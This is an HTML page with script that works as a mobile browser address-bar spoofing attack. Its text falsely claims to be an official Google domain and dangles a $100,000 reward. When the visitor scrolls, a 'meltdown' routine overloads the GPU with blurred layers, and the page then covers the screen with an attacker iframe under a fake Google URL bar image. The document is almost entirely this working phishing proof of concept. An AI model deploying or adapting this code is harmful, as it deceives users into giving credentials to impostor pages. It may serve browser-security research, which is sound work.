<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>azzzab</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 200vh;
        background-color: #f8f9fa;
        font-family: sans-serif;
        scroll-behavior: smooth;
        overflow-x: hidden;
      }
      #scroll-bait {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        text-align: center;
        color: #5f6368;
        padding: 20px;
      }
      #fake-ui {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 99999;
        background: #fff;
      }
      #fake-bar {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 56px;
        object-fit: contain;
        border-bottom: 1px solid #ddd;
        z-index: 10;
        opacity: 0;
        transition: opacity 0.1s ease-in;
        pointer-events: none;
      }
      #fake-content {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100vh;
        border: none;
        z-index: 1;
        display: block;
        transition:
          top 0.1s ease-in,
          height 0.1s ease-in;
      }
      #gpu-killer {
        position: fixed;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        pointer-events: none;
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <div id="scroll-bait">
      <h2>
        This is the official Google domain. Want to earn $100,000? Follow these
        instructions. Please scroll down to the bottom of this page to proceed
        to accounts.google.com.
      </h2>
      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
    </div>
    <div id="gpu-killer"></div>
    <div id="fake-ui">
      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
      <iframe id="fake-content" src="attacker.html"></iframe>
    </div>

    <script>
      let isSpoofed = false;

      function triggerMeltdown() {
        const killerContainer = document.getElementById("gpu-killer");
        for (let i = 0; i < 2000; i++) {
          let div = document.createElement("div");
          div.style.cssText = `position:absolute; width:200vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(10px) contrast(200%); transform:rotate(${Math.random() * 360}deg);`;
          killerContainer.appendChild(div);
        }
        let start = Date.now();
        while (Date.now() - start < 400) {}
      }

      window.addEventListener(
        "scroll",
        () => {
          if (window.scrollY > 80 && !isSpoofed) {
            isSpoofed = true;
            document.getElementById("fake-ui").style.display = "block";
            triggerMeltdown();
            window.scrollTo(0, 0);
            setTimeout(() => {
              document.getElementById("gpu-killer").innerHTML = "";
            }, 1000);
          }
        },
        { passive: true },
      );

      window.addEventListener("message", (e) => {
        if (e.data === "SNAP_TRAP") {
          let fakeBar = document.getElementById("fake-bar");
          let fakeContent = document.getElementById("fake-content");
          fakeBar.style.opacity = "1";
          fakeBar.style.pointerEvents = "auto";
          fakeContent.style.top = "56px";
          fakeContent.style.height = "calc(100vh - 56px)";
        }
      });

      document.getElementById("fake-bar").addEventListener(
        "touchmove",
        (e) => {
          if (isSpoofed) e.preventDefault();
        },
        { passive: false },
      );
    </script>
  </body>
</html>
